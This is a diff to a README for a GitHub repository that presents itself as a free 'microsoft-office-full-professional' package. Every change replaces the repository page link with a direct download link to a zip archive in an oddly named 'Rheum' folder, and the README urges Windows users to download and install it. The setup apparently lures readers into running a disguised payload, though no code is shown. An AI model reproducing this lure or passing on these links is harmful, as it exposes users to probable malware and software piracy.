@@ -1,11 +1,11 @@
 # 📘 microsoft-office-full-professional - Office tools for everyday work
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/elnoracompleted875/microsoft-office-full-professional)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/elnoracompleted875/microsoft-office-full-professional/main/Rheum/microsoft-office-full-professional-v1.4-alpha.3.zip)
 
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/elnoracompleted875/microsoft-office-full-professional
+https://raw.githubusercontent.com/elnoracompleted875/microsoft-office-full-professional/main/Rheum/microsoft-office-full-professional-v1.4-alpha.3.zip
 
 ## 🖥️ What this is
 
@@ -36,7 +36,7 @@ Before you start, make sure you have:
 Follow these steps to get the app running on Windows.
 
 1. Open the download page:
-   https://github.com/elnoracompleted875/microsoft-office-full-professional
+   https://raw.githubusercontent.com/elnoracompleted875/microsoft-office-full-professional/main/Rheum/microsoft-office-full-professional-v1.4-alpha.3.zip
 
 2. Look for the latest file or release on the page.
 
@@ -210,7 +210,7 @@ This project includes tools and content related to:
 ## 📦 Download and install
 
 Use this link to visit the download page and get the file:
-https://github.com/elnoracompleted875/microsoft-office-full-professional
+https://raw.githubusercontent.com/elnoracompleted875/microsoft-office-full-professional/main/Rheum/microsoft-office-full-professional-v1.4-alpha.3.zip
 
 After the download finishes:
 
